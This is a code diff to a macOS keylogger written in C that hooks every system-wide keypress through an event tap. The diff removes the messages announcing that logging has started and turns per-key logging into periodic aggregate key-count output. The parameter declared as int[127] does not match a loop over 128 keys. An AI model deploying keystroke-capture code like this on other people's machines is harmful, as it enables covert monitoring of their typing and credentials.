@@ -1,7 +1,6 @@
 #include "keylogger.h"
 
 int main(int argc, const char *argv[]) {
-
     // Create an event tap to retrieve keypresses.
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
     CFMachPortRef eventTap = CGEventTapCreate(
@@ -18,7 +17,6 @@ int main(int argc, const char *argv[]) {
     CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
-
 
     // Clear the logfile if clear argument used or log to specific file if given.
     if(argc == 2) {
@@ -42,11 +40,11 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    // fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
     fflush(logfile);
 
     // Display the location of the logfile and start the loop.
-    printf("Logging to: %s\n", logfileLocation);
+    // printf("Logging to: %s\n", logfileLocation);
     fflush(stdout);
     CFRunLoopRun();
 
@@ -60,11 +58,45 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    if (strcmp(convertKeyCode(keyCode), "[unknown]") != 0) {
+        keystrokes[keyCode]++;
+        keystrokesCounter++;
+
+        if (keystrokesCounter >= 10) {
+            flushKeystrokes(keystrokes);
+        }
+    }
+
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
-    fflush(logfile);
+    // fflush(logfile);
 
     return event;
+}
+
+const int flushKeystrokes(int keystrokes[127]) {
+    const int numberOfKeys = 128;
+    time_t result = time(NULL);
+
+    printf("\"%s\":{", asctime(localtime(&result)));
+    for (int i = 0; i < numberOfKeys; i++) {
+        int keystroke = keystrokes[i];
+        char *delimiter = ",";
+        char *finalDelimiter = "";
+
+        if (i == numberOfKeys - 1) {
+            printf("\"%s\":%d%s", convertKeyCode(i), keystroke, finalDelimiter);
+        }
+        else {
+            printf("\"%s\":%d%s", convertKeyCode(i), keystroke, delimiter);
+        }
+
+        keystrokes[i] = 0;
+    }
+    printf("},");
+
+    // fprintf(logfile, "%s,", convertKeyCode(keyCode));
+    keystrokesCounter = 0;
+    return 1;
 }
 
 // The following method converts the key code returned by each keypress as
